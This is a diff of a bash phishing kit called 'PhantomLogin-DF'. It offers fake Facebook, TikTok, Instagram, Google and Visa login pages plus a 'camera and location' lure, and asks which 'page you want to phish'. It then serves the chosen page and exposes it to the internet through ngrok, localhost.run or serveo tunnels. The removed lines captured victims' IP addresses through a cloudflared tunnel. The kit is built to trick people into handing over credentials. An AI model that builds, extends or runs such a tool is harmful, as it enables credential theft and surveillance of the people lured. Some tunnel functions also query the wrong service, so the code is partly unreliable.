@@ -22,73 +22,100 @@ show_banner() {
     echo -e "-----------------------------------------------------------------------------------${NC}"
 }
 
-dependencies() {
-    command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
-    command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
+show_menu() {
+    echo -e "${GREEN}Welcome to PhantomLogin-DF${NC}"
+    echo -e "${YELLOW}=================================${NC}"
+    echo -e "${BLUE}1. Facebook login${NC}"
+    echo -e "${BLUE}2. Tik tok login${NC}"
+    echo -e "${BLUE}3. Instagram login${NC}"
+    echo -e "${BLUE}4. Google login${NC}"
+    echo -e "${BLUE}5. Visa login${NC}"
+    echo -e "${BLUE}6. camera and location${NC}"
+    echo -e "${YELLOW}=================================${NC}"
 }
 
-stop() {
-    pkill -f -2 cloudflared > /dev/null 2>&1
-    killall -2 cloudflared > /dev/null 2>&1
-    killall -2 php > /dev/null 2>&1
-    exit 1
-}
-
-catch_ip() {
-    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
-    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
-    cat ip.txt >> saved.ip.txt
-}
-
-checkfound() {
-    printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets, Press Ctrl + C to exit...\e[0m\n"
+start_local_server() {
+    echo -e "${GREEN}Starting local server...${NC}"
+    python3 -m http.server 8000 &> /dev/null &
+    server_pid=$!
+    echo -e "${GREEN}Local server started at http://127.0.0.1:8000/${page}.html${NC}"
+    echo -e "${YELLOW}Press Ctrl+C to stop the server.${NC}"
+    trap "kill $server_pid 2> /dev/null" EXIT
     while true; do
-        if [[ -e "ip.txt" ]]; then
-            printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
-            catch_ip
-            rm -rf ip.txt
-            tail -f -n 110 data.txt
-        fi
-        sleep 0.5
+        sleep 1
     done
 }
 
-cf_server() {
-    if [[ ! -e cloudflared ]]; then
-        printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\n"
-        arch=$(uname -m)
-        arch2=$(uname -a | grep -o 'Android' | head -n1)
-        if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
-            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1
-        elif [[ "$arch" == *'aarch64'* ]]; then
-            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1
-        elif [[ "$arch" == *'x86_64'* ]]; then
-            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
-        else
-            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared > /dev/null 2>&1
-        fi
-        chmod +x cloudflared
-    fi
-    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
-    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
-    sleep 2
-    printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
-    rm cf.log > /dev/null 2>&1 &
-    ./cloudflared tunnel -url 127.0.0.1:3333 --logfile cf.log > /dev/null 2>&1 &
-    sleep 10
-    link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cf.log")
-    if [[ -z "$link" ]]; then
-        printf "\e[1;31m[!] Direct link is not generating \e[0m\n"
+start_ngrok() {
+    echo -e "${GREEN}Starting ngrok...${NC}"
+    ngrok http 8000 &> /dev/null &
+    ngrok_pid=$!
+    sleep 5
+    ngrok_url=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
+    if [[ -z "$ngrok_url" ]]; then
+        echo -e "${RED}Failed to start ngrok. Please make sure ngrok is installed and try again.${NC}"
         exit 1
-    else
-        printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
     fi
-    sed 's+forwarding_link+'$link'+g' template.php > index.php
-    checkfound
+    echo -e "${GREEN}Ngrok URL: ${ngrok_url}/${page}.html${NC}"
+    echo -e "${YELLOW}Press Ctrl+C to stop ngrok.${NC}"
+    trap "kill $ngrok_pid 2> /dev/null" EXIT
+    while true; do
+        sleep 1
+    done
 }
 
-generate_facebook() {
-    cat > "Facebook_login.html" <<EOF
+start_localhost_run() {
+    echo -e "${GREEN}Starting localhost.run tunnel...${NC}"
+    ssh -R 80:localhost:8000 localhost.run &> /dev/null &
+    localhost_run_pid=$!
+    sleep 5
+    localhost_run_url=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
+    if [[ -z "$localhost_run_url" ]]; then
+        echo -e "${RED}Failed to start localhost.run. Please make sure ssh is installed and try again.${NC}"
+        exit 1
+    fi
+    echo -e "${GREEN}localhost.run URL: ${localhost_run_url}/${page}.html${NC}"
+    echo -e "${YELLOW}Press Ctrl+C to stop localhost.run.${NC}"
+    trap "kill $localhost_run_pid 2> /dev/null" EXIT
+    while true; do
+        sleep 1
+    done
+}
+
+start_serveo() {
+    echo -e "${GREEN}Starting Serveo.net tunnel...${NC}"
+    ssh -R 80:localhost:8000 serveo.net &> /dev/null &
+    serveo_pid=$!
+    sleep 5
+    serveo_url=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
+    if [[ -z "$serveo_url" ]]; then
+        echo -e "${RED}Failed to start Serveo.net. Please make sure ssh is installed and try again.${NC}"
+        exit 1
+    fi
+    echo -e "${GREEN}Serveo.net URL: ${serveo_url}/${page}.html${NC}"
+    echo -e "${YELLOW}Press Ctrl+C to stop Serveo.net.${NC}"
+    trap "kill $serveo_pid 2> /dev/null" EXIT
+    while true; do
+        sleep 1
+    done
+}
+
+show_banner
+
+echo -e "${GREEN}Enter Token:${NC}"
+read token
+echo -e "${GREEN}Enter ID:${NC}"
+read id
+
+show_menu
+
+echo -e "${GREEN}Choose the page you want to phish:${NC}"
+read choice
+
+case $choice in
+    1)
+        page="Facebook_login"
+        cat > "${page}.html" <<EOF
 <!DOCTYPE html>
 <html lang="en">
 <head>
